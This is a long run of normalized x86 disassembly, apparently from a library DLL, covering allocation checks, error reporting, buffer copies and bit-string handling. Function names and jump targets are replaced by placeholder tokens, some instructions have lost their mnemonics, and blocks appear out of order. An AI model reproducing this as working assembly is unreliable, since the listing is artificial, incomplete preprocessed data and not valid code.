cmp eax ecx
jle r-xdata
push esi
push ebx
call sub_1002a0a0
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
push 0x389
push r--data
push 0x10
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ edi ]
cmp ecx eax
jle r-xdata
mov edx [ esp + 0x10 ]
push edi
push edx
call sub_1002a0a0
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
test eax eax
jle r-xdata
mov eax [ esp + 0x10 ]
push 0x0
push eax
call sub_1002a0a0
add esp 0x8
test eax eax
je r-xdata
push 0x39f
push r--data
push 0x73
jmp r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x392
push r--data
mov edx [ ecx + 0x8 ]
mov eax [ edx ]
push eax
call sub_1001d4c0
add esp 0xc
mov [ ebx + 0x3c ] eax
test eax eax
jne r-xdata
push eax
call sub_1001d740
add esp 0x4
push esi
push ebx
call sub_1002a0a0
add esp 0x8
test eax eax
je r-xdata
jmp r-xdata
push 0x9d
push 0x10
call sub_1001de60
add esp 0x14
mov ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebx + 0x3c ]
mov eax [ ecx + 0x8 ]
mov ecx [ eax ]
mov esi [ eax + 0x8 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ecx ]
mov [ ebx + 0x40 ] edx
push 0x395
push r--data
push 0x41
jmp r-xdata
mov ecx [ edi ]
mov edx [ esp + 0x10 ]
push ecx
push edx
call sub_1002a0a0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x10 ]
push 0x0
push edx
push eax
push ecx
call sub_1004eca0
jmp r-xdata
push ebx
call sub_1002d150
mov esi eax
add esp 0x4
test esi esi
mov [ esp + 0x1c ] esi
je r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ esp + 0x10 ]
push eax
push ecx
call sub_1002a0a0
add esp 0x8
test eax eax
je r-xdata
mov ebx eax
add esp 0x10
test ebx ebx
jne r-xdata
push ebx
call sub_1002c490
add esp 0x4
mov eax [ ebp + 0xc ]
xor edx edx
mov ecx [ eax + 0x8 ]
mov dl [ ecx ]
and edx 0xfffffffe
push edx
push ebx
call sub_1002cb70
mov eax [ ebp + 0xc ]
push 0x0
mov ecx [ eax ]
mov edx [ eax + 0x8 ]
push ecx
push edx
push esi
push ebx
call sub_1002d7c0
add esp 0x1c
test eax eax
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ esp + 0x10 ]
push edx
push eax
call sub_1002a0a0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ ebp + 0x10 ]
push eax
push ecx
call sub_1002f620
mov edi eax
add esp 0x8
test edi edi
mov [ esp + 0x18 ] edi
jne r-xdata
push 0x3ad
mov ecx [ esp + 0x10 ]
push 0x0
push ecx
call sub_1002a0a0
add esp 0x8
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
push 0x3b4
push r--data
push 0xd
jmp r-xdata
push 0x3b9
push r--data
push 0x7a
jmp r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push edi
call sub_10029870
mov edx [ esp + 0x28 ]
add esp 0x4
inc edx
cmp eax edx
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jne r-xdata
push 0x3be
push r--data
push 0x7a
jmp r-xdata
mov ecx [ esp + 0x14 ]
push ecx
push eax
call sub_1002f620
mov esi eax
add esp 0x8
test esi esi
mov [ esp + 0x14 ] esi
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
call sub_10029950
add esp 0x4
xor esi esi
mov [ esp + 0x14 ] esi
mov ebp [ esp + 0x1c ]
push esi
push edi
push ebp
push ebx
call sub_1002c970
add esp 0x10
test eax eax
jne r-xdata
push 0x3ce
push r--data
push 0xd
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push 0x3d4
jmp r-xdata
push r--data
push 0x10
sub_1004fd40
mov eax 0x4
call sub_1001d0d0
push r--data
mov [ esp + 0x4 ] 0x0
call sub_10033120
add esp 0x4
mov [ esp ] eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
push r--data
push eax
lea edx [ esp + 0x8 ]
push ecx
push edx
call sub_10030ec0
add esp 0x10
mov [ esp ] eax
test eax eax
jne r-xdata
push 0x456
push r--data
push 0x41
push 0x92
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop ecx
retn
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
push 0x45c
push r--data
push 0x10
push 0x92
push 0x10
call sub_1001de60
mov eax [ esp + 0x14 ]
push r--data
push eax
call sub_10033840
add esp 0x1c
xor eax eax
pop ecx
retn
call sub_10028f90
mov esi eax
test esi esi
jne r-xdata
mov esi [ edi ]
test esi esi
jne r-xdata
test edi edi
je r-xdata
push 0x466
push r--data
push 0x41
push 0x92
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov [ edi ] esi
xor esi esi
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ecx
retn
push r--data
push eax
call sub_10033840
add esp 0x8
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ esi ] edx
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
push 0x478
push r--data
push 0x10
jmp r-xdata
mov edx [ esp + 0x8 ]
mov eax [ edx + 0x8 ]
push eax
call sub_1004f5b0
add esp 0x4
mov [ esi + 0x4 ] eax
push eax
call sub_1002c490
add esp 0x4
push 0x48e
push r--data
push 0x7d
mov ecx [ esi + 0xc ]
mov edx [ eax ]
mov eax [ eax + 0x8 ]
push ecx
push edx
push eax
call sub_10029d50
add esp 0xc
mov [ esi + 0xc ] eax
test eax eax
jne r-xdata
push 0x92
push 0x10
call sub_1001de60
add esp 0x14
test esi esi
je r-xdata
push esi
call sub_10028ff0
add esp 0x4
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
push 0x487
push r--data
push 0x3
jmp r-xdata
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx [ esi + 0x4 ]
push edx
call sub_1002d150
add esp 0x4
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
push eax
call sub_1002d230
add esp 0x4
mov eax [ esp + 0x8 ]
xor edx edx
push 0x0
mov eax [ eax + 0xc ]
mov ecx [ eax + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ esi + 0x8 ]
mov dl [ ecx ]
push ecx
mov ecx [ esi + 0x4 ]
and edx 0xfffffffe
push eax
push ecx
mov [ esi + 0x14 ] edx
call sub_1002d7c0
add esp 0x14
test eax eax
jne r-xdata
push 0x49c
push r--data
push 0x10
jmp r-xdata
push 0x4a6
push r--data
push 0x10
jmp r-xdata
sub_1004ff70
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
test ebp ebp
push edi
je r-xdata
push 0x538
push r--data
push 0x43
cmp [ ebp ] 0x0
je r-xdata
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
call sub_10028f90
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
test esi esi
je r-xdata
push 0x540
push r--data
push 0x41
jmp r-xdata
mov ebx eax
jmp r-xdata
mov eax [ esp + 0x1c ]
push r--data
push eax
push ebp
push 0x0
lea edi [ ebx + 0x4 ]
call sub_10030ec0
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
mov [ esi ] ebx
push 0x90
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push esi
call sub_1004f5b0
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
push 0x424
push r--data
push 0x75
push 0x91
push 0x10
call sub_1001de60
push r--data
push esi
call sub_10033840
add esp 0x1c
push 0x54b
push r--data
push 0x10
jmp r-xdata
test edi edi
je r-xdata
push 0x42b
push r--data
push 0x7f
push 0x91
push 0x10
call sub_1001de60
add esp 0x14
push 0x54b
push r--data
push 0x10
jmp r-xdata
push r--data
push esi
call sub_10033840
add esp 0x8
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ edi ]
test eax eax
je r-xdata
mov [ edi ] ebp
push eax
call sub_1002c490
add esp 0x4
sub_100500a0
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
test eax eax
je r-xdata
push 0x55a
push r--data
push 0x43
mov esi [ eax ]
test esi esi
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
mov edi [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
mov edx [ esi + 0x8 ]
mov eax [ esi + 0x4 ]
mov ecx [ edi ]
push 0x0
push ebx
push ecx
push edx
push eax
call sub_1002d7c0
add esp 0x14
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_1002d150
add esp 0x4
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
mov ecx [ edi ]
xor edx edx
mov dl [ ecx ]
and edx 0xfffffffe
mov [ esi + 0x14 ] edx
mov eax [ edi ]
add eax ebx
mov [ edi ] eax
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x566
push r--data
push 0x10
jmp r-xdata
push 0x561
push r--data
push 0x41
jmp r-xdata
push 0x98
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_10050150
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
lea ecx [ esp ]
push eax
push ecx
push edx
mov [ esp + 0xc ] 0x0
call sub_100325c0
mov ecx [ esp + 0xc ]
add esp 0xc
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push 0x0
push edx
mov edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push edx
push eax
push ecx
call sub_1002ad90
mov eax [ esp + 0x18 ]
push eax
call sub_1001d740
add esp 0x1c
mov eax 0x1
pop ecx
retn
xor eax eax
pop ecx
retn
sub_100501c0
cmp [ esp + 0x4 ] 0x2
jne r-xdata
mov eax 0x1
retn
mov eax [ esp + 0x8 ]
mov eax [ eax ]
mov ecx [ eax + 0xc ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov edx [ eax ]
mov eax [ eax + 0x8 ]
push edx
push eax
call sub_10026870
add esp 0x8
sub_100501f0
cmp [ esp + 0x4 ] 0x1
jne r-xdata
mov eax 0x1
retn
mov eax [ esp + 0x8 ]
push esi
push 0x4f
mov esi [ eax ]
call sub_10022900
add esp 0x4
mov [ esi ] eax
mov eax 0x1
pop esi
retn
sub_10050220
mov eax 0x4
call sub_1001d0d0
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
xor edi edi
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
push ebx
call sub_1001e7b0
mov esi eax
add esp 0x4
dec esi
js r-xdata
mov esi [ esp + 0x24 ]
push esi
push edi
push 0x1
call sub_1002eb00
mov ebp [ esp + 0x28 ]
add esp 0xc
test ebp ebp
mov [ esp + 0x10 ] eax
je r-xdata
push 0x0
push esi
push ebx
call sub_1001e7c0
add esp 0x8
push eax
call [ esp + 0x28 ]
add esp 0x8
add edi eax
dec esi
jns r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov ecx [ esp + 0x28 ]
mov eax [ ebp ]
push ecx
push esi
push edi
lea edx [ esp + 0x24 ]
push 0x1
push edx
mov [ esp + 0x2c ] eax
call sub_1002ea00
mov eax [ esp + 0x40 ]
add esp 0x14
test eax eax
je r-xdata
push ebx
xor esi esi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push ebx
call sub_1001e7b0
add esp 0x4
cmp eax 0x2
jl r-xdata
mov eax [ esp + 0x18 ]
mov [ ebp ] eax
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x18 ]
push edx
push esi
push ebx
call sub_1001e7c0
add esp 0x8
push eax
call [ esp + 0x28 ]
push ebx
inc esi
call sub_1001e7b0
add esp 0xc
cmp esi eax
jl r-xdata
mov eax [ esp + 0x18 ]
push 0x7a
push r--data
push ebx
mov [ esp + 0x30 ] eax
call sub_1001e7b0
add esp 0x4
shl eax 0x3
push eax
call sub_1001d4c0
mov ebp eax
add esp 0xc
test ebp ebp
mov [ esp + 0x2c ] ebp
jne r-xdata
push ebx
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0x7d
jmp r-xdata
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
push sub_10032e50
push 0x8
mov [ ecx ] eax
mov ecx [ esp + 0x2c ]
sub eax ecx
push ebx
mov edi eax
mov [ esp + 0x34 ] edi
call sub_1001e7b0
add esp 0x4
push eax
push ebp
call qsort
push 0x8f
push r--data
push edi
call sub_1001d4c0
mov esi eax
add esp 0x1c
test esi esi
mov [ esp + 0x1c ] esi
jne r-xdata
mov esi ebp
push r--data
push 0x41
push 0xbc
push 0xd
call sub_1001de60
add esp 0x14
push ebx
mov [ esp + 0x1c ] esi
mov [ esp + 0x24 ] 0x0
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0x91
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x18 ]
push edx
push edi
push ebx
mov [ esi ] ecx
call sub_1001e7c0
add esp 0x8
push eax
call [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
mov ecx [ esi ]
sub eax ecx
push ebx
mov [ esi + 0x4 ] eax
inc edi
add esi 0x8
call sub_1001e7b0
add esp 0xc
cmp edi eax
jl r-xdata
mov ecx edi
mov edi [ esp + 0x24 ]
mov edx ecx
mov eax [ esp + 0x1c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
and ecx 0x3
[ edi ] [ esi ]
call sub_1001d740
mov ecx [ esp + 0x30 ]
push ecx
call sub_1001d740
mov eax [ esp + 0x18 ]
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
add ebp 0x4
mov ecx [ ebp ]
mov esi [ ebp - 0x4 ]
mov edi [ esp + 0x18 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebx
and ecx 0x3
add ebp 0x8
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov edx [ esp + 0x1c ]
mov esi [ esp + 0x24 ]
add edx eax
inc esi
mov [ esp + 0x1c ] edx
mov [ esp + 0x24 ] esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
mov edi [ esp + 0x28 ]
mov esi [ esp + 0x1c ]
sub_10050480
mov eax 0x10
call sub_1001d0d0
push esi
push edi
mov edi [ esp + 0x1c ]
xor esi esi
cmp [ edi ] 0x0
jne r-xdata
push 0xf0
push r--data
push 0x1e
push 0x9
call sub_1001f5b0
mov eax [ edi ]
add esp 0x10
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x10
retn
push 0x136
push r--data
push 0x1e
push 0xa
call sub_1001f5b0
add esp 0x10
call sub_1001df60
mov eax esi
pop edi
pop esi
add esp 0x10
retn
mov ecx [ esp + 0x20 ]
lea edx [ esp + 0x8 ]
push edx
push eax
mov [ esp + 0x10 ] ecx
call sub_1001ff80
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov eax [ edi + 0x8 ]
push ebp
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_100224d0
add esp 0x4
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
push 0x0
push eax
mov ebp 0x1
call sub_1001e7c0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov esi [ edi + 0x8 ]
jmp r-xdata
mov esi [ edi + 0x8 ]
jmp r-xdata
mov [ edi + 0xc ] 0x1
pop ebp
mov eax [ esi + 0x54 ]
test eax eax
jg r-xdata
push esi
call sub_100224d0
add esp 0x4
test eax eax
jne r-xdata
test [ rw-data ] 0x1
jne r-xdata
cmp [ edi + 0x8 ] esi
je r-xdata
mov ecx [ edi + 0x4 ]
mov eax ebp
push eax
push ecx
inc ebp
call sub_1001e7c0
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push esi
call sub_100224d0
add esp 0x4
test eax eax
je r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov [ edi + 0x8 ] esi
push 0x0
push eax
call sub_10022510
add esp 0x8
sub_100505f0
mov ecx [ esp + 0xc ]
mov al [ ecx ]
cmp al 0x1
je r-xdata
mov ecx [ ecx + 0x10 ]
test ecx ecx
je r-xdata
cmp al 0x6
jne r-xdata
xor eax eax
retn
test [ ecx + 0x4 ] 0x1
je r-xdata
mov edx [ esp + 0x4 ]
mov eax [ ecx + 0x8 ]
push esi
mov esi [ edx ]
mov edx [ esp + 0xc ]
add eax esi
pop esi
test edx edx
jne r-xdata
mov ecx [ ecx + 0xc ]
push 0x75
push r--data
push ecx
push edx
push eax
call sub_1001f5f0
add esp 0x14
retn
mov [ eax ] 0x1
mov eax 0x1
retn
sub_10050650
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
test [ eax + 0x4 ] 0x2
je r-xdata
mov eax [ eax + 0x14 ]
add eax ecx
test eax eax
je r-xdata
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] 0x1
sub_10050690
mov eax [ esp + 0x4 ]
push esi
test eax eax
je r-xdata
pop esi
retn
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esp + 0xc ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
test [ eax + 0x4 ] 0x2
je r-xdata
mov esi [ eax + 0x14 ]
add esi ecx
test esi esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
push eax
call sub_1001d740
add esp 0x4
sub_100506e0
mov eax [ esp + 0x4 ]
push ebx
test eax eax
push ebp
je r-xdata
pop ebp
mov eax 0x1
pop ebx
retn
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
test [ eax + 0x4 ] 0x2
je r-xdata
mov ebx [ eax + 0x14 ]
add ebx ecx
test ebx ebx
jne r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov ebp [ esp + 0x14 ]
push 0xaf
push r--data
push ebp
call sub_1001d4c0
add esp 0xc
mov [ ebx ] eax
test eax eax
jne r-xdata
push eax
call sub_1001d740
add esp 0x4
mov ecx ebp
push esi
mov esi [ esp + 0x14 ]
mov edx ecx
push edi
mov edi [ ebx ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov [ ebx + 0x4 ] ebp
pop esi
mov [ ebx + 0x8 ] 0x0
pop ebp
pop ebx
retn
pop ebp
pop ebx
retn
sub_10050770
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
xor eax eax
retn
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
test [ eax + 0x4 ] 0x2
je r-xdata
mov eax [ eax + 0x14 ]
add eax ecx
test eax eax
je r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x8 ]
test edx edx
je r-xdata
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x4 ]
push ebx
push esi
mov esi [ eax ]
mov ebx ecx
push edi
mov edi [ edx ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ eax + 0x4 ]
mov esi [ edx ]
add esi ecx
pop edi
mov [ edx ] esi
pop esi
pop ebx
mov eax 0x1
retn
mov edx [ eax + 0x4 ]
mov [ ecx ] edx
sub_10050810
push esi
mov esi [ esp + 0xc ]
push edi
mov eax [ esi ]
test ah 0x3
jne r-xdata
call [ esi + 0x10 ]
mov ecx [ esp + 0xc ]
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ecx ]
add eax edx
jne r-xdata
mov eax esi
pop edi
pop esi
retn
mov ecx [ esi ]
test ch 0x1
je r-xdata
mov eax [ edi + 0x18 ]
test eax eax
je r-xdata
mov eax [ eax ]
push eax
call sub_1002f4d0
mov edx [ eax ]
push edx
call sub_10022ae0
jmp r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
retn
mov eax [ edi + 0x14 ]
test eax eax
jne r-xdata
cmp [ edx ] eax
je r-xdata
mov esi [ edi + 0x10 ]
mov edx [ edi + 0xc ]
add esp 0x4
xor ecx ecx
test esi esi
jle r-xdata
xor eax eax
push 0x115
push r--data
push 0xa4
push 0x6e
push 0xd
call sub_1001de60
add esp 0x14
pop edi
pop esi
retn
pop edi
pop esi
lea eax [ edx + 0x4 ]
retn
inc ecx
add edx 0x18
cmp ecx esi
jl r-xdata
sub_100508b0
push ebx
push esi
mov esi [ esp + 0xc ]
test esi esi
jne r-xdata
mov ebx [ esi ]
test ebx ebx
jle r-xdata
pop esi
xor eax eax
pop ebx
retn
xor eax eax
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov edx [ ecx ]
mov ecx ebx
push ebp
mov ebp ecx
mov [ edx ] al
mov esi [ esi + 0x8 ]
inc edx
push edi
mov edi edx
add edx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop ebp
test ebx ebx
jle r-xdata
pop esi
mov eax edx
pop ebx
retn
mov ecx [ esi + 0x8 ]
lea eax [ ecx + ebx - 0x1 ]
and eax 0x7
jmp r-xdata
mov eax [ esp + 0x10 ]
pop esi
pop ebx
mov [ eax ] edx
mov eax [ esp + 0x4 ]
retn
or bl 0xff
mov ecx eax
mov al [ edx - 0x1 ]
shl bl cl
and al bl
mov [ edx - 0x1 ] al
xor eax eax
mov al [ ecx + ebx - 0x1 ]
test al 0x1
jne r-xdata
dec ebx
dec eax
test ebx ebx
jg r-xdata
mov ecx [ esp + 0x10 ]
lea edx [ ebx + 0x1 ]
test ecx ecx
mov [ esp + 0xc ] edx
jne r-xdata
test al 0x2
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
test al 0x4
je r-xdata
mov eax 0x1
jmp r-xdata
test al 0x8
je r-xdata
mov eax 0x2
jmp r-xdata
test al 0x10
je r-xdata
mov eax 0x3
jmp r-xdata
test al 0x20
je r-xdata
mov eax 0x4
jmp r-xdata
test al 0x40
je r-xdata
mov eax 0x5
jmp r-xdata
and al 0x80
neg al
sbb eax eax
and eax 0x7
jmp r-xdata
mov eax 0x6
jmp r-xdata
sub_10050990
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x1c ]
xor ebx ebx
push esi
cmp ebp 0x1
push edi
jge r-xdata
mov edi [ esp + 0x1c ]
test edi edi
je r-xdata
mov edi [ esp + 0x1c ]
mov eax 0x98
jmp r-xdata
push 0x3
call sub_1002edc0
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov ebx [ edi ]
test ebx ebx
jne r-xdata
push 0xa8
push r--data
push eax
push 0xbd
push 0xd
call sub_1001de60
add esp 0x14
test ebx ebx
je r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ ebx + 0xc ]
and ecx 0xfffffff8
mov edx ebp
mov esi [ eax ]
xor eax eax
mov al [ esi ]
inc esi
mov [ esp + 0x14 ] eax
and eax 0x7
or eax ecx
mov [ esp + 0x24 ] esi
or al 0x8
dec ebp
cmp edx 0x1
mov [ ebx + 0xc ] eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
test edi edi
je r-xdata
mov [ esp + 0x10 ] 0x0
mov eax [ esp + 0x10 ]
push 0x93
push r--data
push ebp
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
push ebx
call sub_1002ee10
add esp 0x4
cmp [ edi ] ebx
je r-xdata
test edi edi
mov [ ebx + 0x8 ] eax
mov [ ebx + 0x4 ] 0x3
je r-xdata
mov eax ecx
push eax
call sub_1001d740
mov eax [ esp + 0x14 ]
add esp 0x4
mov ecx ebp
mov edi eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
or dl 0xff
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0x1c ]
shl dl cl
mov cl [ eax + ebp - 0x1 ]
and cl dl
mov [ eax + ebp - 0x1 ] cl
mov ecx [ esp + 0x24 ]
add ecx ebp
mov [ esp + 0x24 ] ecx
mov esi ecx
jmp r-xdata
mov eax 0x41
mov ecx [ esp + 0x20 ]
pop edi
mov eax ebx
mov [ ecx ] esi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov [ edi ] ebx
mov ecx [ ebx + 0x8 ]
mov [ ebx ] ebp
test ecx ecx
je r-xdata
sub_10050ae0
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
mov eax esi
and esi 0x7
cdq
and edx 0x7
mov ecx 0x7
add eax edx
sub ecx esi
mov ebp eax
mov eax 0x1
shl eax cl
push edi
mov edi [ esp + 0x1c ]
sar ebp 0x3
test edi edi
mov ebx eax
mov [ esp + 0x18 ] eax
not ebx
jne r-xdata
mov esi [ esp + 0x14 ]
test esi esi
jne r-xdata
mov [ esp + 0x18 ] edi
mov eax edi
mov ecx [ esi + 0xc ]
mov edx [ esi ]
and ecx 0xfffffff0
mov [ esi + 0xc ] ecx
lea ecx [ ebp + 0x1 ]
cmp edx ecx
jl r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
test edi edi
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x8 ]
add ebp ecx
and bl [ ebp ]
or bl al
mov [ ebp ] bl
mov eax [ esi ]
test eax eax
jle r-xdata
push 0xc7
push r--data
push ecx
push edx
push eax
call sub_1001d620
add esp 0x14
push 0xc3
push r--data
push ecx
call sub_1001d4c0
add esp 0xc
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edi [ esi ]
mov eax ebp
sub eax edi
lea ecx [ eax + 0x1 ]
test ecx ecx
jle r-xdata
push 0xca
push r--data
push 0x41
push 0xb7
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx eax
test edx edx
mov [ esp + 0x1c ] edx
jne r-xdata
dec eax
test eax eax
mov [ esi ] eax
jg r-xdata
lea eax [ ebp + 0x1 ]
mov [ esi + 0x8 ] edx
mov [ esi ] eax
mov eax [ esp + 0x18 ]
add edi edx
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
mov edx [ esp + 0x1c ]
and ecx 0x3
[ edi ]
mov eax [ esi ]
mov dl [ ecx + eax - 0x1 ]
test dl dl
jne r-xdata
sub_10050c10
push esi
mov esi [ esp + 0xc ]
mov eax esi
mov ecx [ esp + 0x8 ]
cdq
and edx 0x7
push edi
add eax edx
sar eax 0x3
test ecx ecx
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov edi [ ecx ]
lea edx [ eax + 0x1 ]
cmp edi edx
jl r-xdata
mov edi [ ecx + 0x8 ]
test edi edi
je r-xdata
mov al [ edi + eax ]
and esi 0x7
mov ecx 0x7
mov edx 0x1
sub ecx esi
pop edi
shl edx cl
pop esi
and dl al
neg dl
sbb edx edx
neg edx
mov eax edx
retn
sub_10050c60
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
push ebx
xor esi esi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov edi [ esp + 0x18 ]
mov edi [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x14 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_1001e3c0
pop edi
pop esi
pop ebx
retn
push esi
push ebx
call sub_1001e7c0
push edi
push eax
push ebp
call sub_10050cc0
push ebx
mov edi eax
inc esi
call sub_1001e7b0
add esp 0x18
cmp esi eax
jl r-xdata
pop ebp
jmp r-xdata
test edi edi
jne r-xdata
sub_10050cc0
mov eax 0x108
call sub_1001d0d0
mov eax [ esp + 0x110 ]
push ebx
mov ecx [ eax ]
cmp ecx 0x8
ja r-xdata
mov eax [ esp + 0x118 ]
pop ebx
add esp 0x108
retn
